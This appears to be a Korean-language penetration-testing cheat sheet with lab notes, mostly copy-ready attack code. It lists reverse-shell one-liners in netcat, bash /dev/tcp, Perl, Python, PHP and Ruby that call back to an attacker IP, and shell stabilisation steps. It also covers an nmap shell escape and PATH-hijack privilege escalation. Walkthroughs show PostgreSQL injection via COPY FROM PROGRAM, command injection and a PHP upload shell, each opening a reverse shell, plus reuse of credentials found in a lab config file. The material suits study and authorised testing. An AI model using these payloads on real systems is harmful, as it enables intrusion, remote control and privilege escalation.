reverse shell
#
`listener`
```
rlwrap nc -nvlp <port>
```
- l: 연결을 듣는다
- v: 상세수준을 설정
- n: dns를 통해 호스트 이름을 확인하지 않는다.
- p: 사용할 포트를 지정한다.

#
`Netcat`
```
nc -e /bin/sh 10.0.0.1 1234
```
잘못된 버전을 사용할 경우 다음과 같이 리버스 셸을 다시 사용할 수 있다

#
`Bash`
```
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```
#
`Perl`
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
#
`python`
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
#
`php`
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
#
`ruby`
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
#
locate
```
/usr/share/webshells/php/php-reverse-shell.php
```
#
`셸 안정화`
```
script /dev/null -c bash
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

```
/bin/sh -i
```
`대화식 셸`
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

[nmap](https://gtfobins.github.io/gtfobins/nmap/)
```
nmap --interactive
!sh
```
![image](https://user-images.githubusercontent.com/61821641/152297137-ab84a146-d2ba-462d-bf85-4b33ef5fd69b.png)
#
`절대 경로 대신 상대 경로를 사용하여 cat binary를 호출하는 것을 볼 수 있다. 악의적인 cat을 만들고 현재 작업 디렉토리를 포함하도록 경로를 수정하면 잘못된 구성을 악용할 수 있으며 권한을 루트로 높일 수 있다.`
```
export PATH=/tmp:$PATH
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
```

#
`sql injection`
```
' UNION SELECT NULL, NULL, NULL , NULL, VERSION() --
```
이 SQL 문을 사용하면 이 웹 사이트의 백엔드 데이터베이스가 Postgre임을 알 수 있습니다.SQL 버전 11.5. "Google University"에서 어떤 종류의 reverse shell을 얻을 수 있는지 알아보겠습니다. 우리는 Postgre에서 발견된 exploit에 대해 알게 되었다.버전 11.5의 경우 SQL 버전 9.3이 아직 살아 있습니다. * 메타스플로이트를 사용

`![image](https://user-images.githubusercontent.com/61821641/150574663-24469d46-8cb2-4bc2-89ed-fdd4d3af03c9.png)


`이어서 reverse shell`

```
'; CREATE TABLE cmd_exec(cmd_output text); --
'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/<my ip>/1234 0>&1'''; -- 
```

![image](https://user-images.githubusercontent.com/61821641/150575592-27443005-8908-470b-83ec-0d977f32a386.png)

#
```
echo "AB; nc -e /bin/sh 10.10.14.17 1234" | nc 127.0.0.1 6697
```
![image](https://user-images.githubusercontent.com/61821641/152299600-f1a2ddfa-3c9e-433c-856e-2fbc005e08d6.png)
#

`1. php 업로드`
```
<?php
  exec("/bin/bash -c 'bash -i &> /dev/tcp/10.10.14.217/1234 0<&1'")
?>
```
`2. 셸 안정화`
```
script /dev/null -c bash
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
```
`3. 탐색(home, var 하위 디렉토리)`
```
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```
`4. 얻은 정보로 권한 상승?`
```
su robert
M3g4C0rpUs3r!
``` 
```
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
```
find / -group bugtracker 2>/dev/null
```
`bugtracker`그룹에 접근
```
find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```
id를 몰라서 접근이 안된다.

![image](https://user-images.githubusercontent.com/61821641/149992123-52fab6e7-b05b-41ea-b696-72f866995ed3.png)

`절대 경로 대신 상대 경로를 사용하여 cat binary를 호출하는 것을 볼 수 있다. 악의적인 cat을 만들고 현재 작업 디렉토리를 포함하도록 경로를 수정하면 잘못된 구성을 악용할 수 있으며 권한을 루트로 높일 수 있다.`
```
export PATH=/tmp:$PATH
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
```
#
1. 포트 1234(또는 수신하려는 포트)를 통해 대상 시스템의 IPv4 주소에서 공격 시스템의 IPv4 주소로의 모든 TCP 인바운드 연결을 허용
```
sudo ufw allow from <target ip> proto tcp to any port 1234
nc -lvnp 1234
```
2. 
![image](https://user-images.githubusercontent.com/61821641/150576818-3437aa8c-226b-412d-8402-1d33fb6a8cdf.png)
```
'; CREATE TABLE cmd_exec(cmd_output text); --
'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/<my ip>/1234 0>&1'''; -- 
```
3. 상호작용적인 shell 만들기
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
![image](https://user-images.githubusercontent.com/61821641/150577289-9a5f4915-a62c-4851-bbdd-c6663af8688a.png)

#
reference

- [reverse shell php](https://github.com/BlackArch/webshells)
- [reverse shell payload](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [reverse shell payload](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [nmap](https://gtfobins.github.io/gtfobins/nmap/)